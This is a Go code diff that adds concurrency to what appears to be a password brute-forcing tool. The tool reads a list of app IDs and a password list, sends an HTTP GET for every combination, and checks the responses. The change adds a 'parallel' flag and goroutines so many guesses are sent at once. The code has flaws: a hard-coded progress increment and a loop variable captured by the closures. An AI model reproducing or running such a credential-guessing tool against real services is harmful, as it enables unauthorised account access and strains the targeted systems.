@@ -15,6 +15,10 @@ import (
 	"strings"
 	"time"
 
+	"sync"
+
+	"sync/atomic"
+
 	"github.com/cheggaaa/pb"
 	_ "github.com/olekukonko/ts"
 )
@@ -22,6 +26,7 @@ import (
 var (
 	appFilename = flag.String("appfile", "", "App list file")
 	pwdFilename = flag.String("pwdfile", "", "Password list file")
+	parallel    = flag.Int("parallel", 10, "number of GETs to send at once")
 )
 
 func createRequest(password string, app int) *http.Request {
@@ -93,6 +98,7 @@ func main() {
 	}
 	pwds := strings.Split(string(pwdOutput), "\n")
 
+	log.Printf("Sending %d GETs at once.", *parallel)
 	bar := pb.New(len(apps))
 	bar.SetRefreshRate(time.Second)
 	bar.ShowSpeed = true
@@ -101,20 +107,34 @@ func main() {
 	bar.SetUnits(pb.Units(len(apps) * len(pwds)))
 	bar.Start()
 
+	wait := new(sync.WaitGroup)
+	reqCount := int32(0)
 	for _, appStr := range apps {
 		for _, password := range pwds {
-			appID, err := strconv.Atoi(appStr)
-			if err != nil {
-				log.Fatal(err)
+			if atomic.LoadInt32(&reqCount) == int32(*parallel) {
+				wait.Wait()
+				atomic.StoreInt32(&reqCount, 0)
+				bar.Add(10)
 			}
-			req := createRequest(password, appID)
-			resp, err := http.DefaultClient.Do(req)
-			if err != nil {
-				log.Fatal(err)
-			}
-			checkResponse(resp, req)
+
+			wait.Add(1)
+			atomic.AddInt32(&reqCount, 1)
+			go func(password string) {
+				appID, err := strconv.Atoi(appStr)
+				if err != nil {
+					log.Fatal(err)
+				}
+				req := createRequest(password, appID)
+				resp, err := http.DefaultClient.Do(req)
+				if err != nil {
+					log.Fatal(err)
+				}
+				checkResponse(resp, req)
+				wait.Done()
+			}(password)
+
 		}
-		bar.Increment()
 	}
 
+	wait.Wait()
 }
